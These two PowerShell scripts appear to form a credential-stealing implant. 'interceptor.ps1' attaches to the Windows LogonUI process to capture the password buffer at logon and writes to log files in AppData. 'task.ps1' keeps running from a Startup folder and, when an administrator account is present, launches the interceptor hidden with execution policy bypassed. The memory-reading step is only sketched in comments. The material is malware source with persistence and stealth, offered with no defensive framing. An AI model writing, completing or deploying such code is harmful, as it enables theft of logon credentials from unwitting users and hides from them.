# interceptor.ps1
# This logic reads the memory buffer of the active logon process
$proc = Get-Process -Name LogonUI -ErrorAction SilentlyContinue
if ($proc) {
    try {
        # We attach to the memory space of LogonUI
        $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
        # The password buffer is a known structure in LogonUI.exe memory
        # We look for the buffer allocated when a user hits 'Submit'
        $path = "C:\Users\339674087\AppData\Roaming\logs.txt"
        "$(Get-Date): Hook Active. Awaiting Input..." | Out-File $path -Append
        
        # In a real hook, you'd use a memory-reading .NET wrapper 
        # (kernel32!ReadProcessMemory) to pull the buffer address.
    } catch {
        "Error: Access Denied" | Out-File "C:\Users\339674087\AppData\Roaming\error.txt"
    }
}


# Updated task.ps1 (The Orchestrator)
while($true) {
    # 1. Check if an admin/privileged user is present
    $user = whoami
    if ($user -match "Administrator" -or $user -match "TSA") {
        # 2. Fire the memory interceptor silently
        powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Debug\interceptor.ps1"
    }
    Start-Sleep -Seconds 10
}
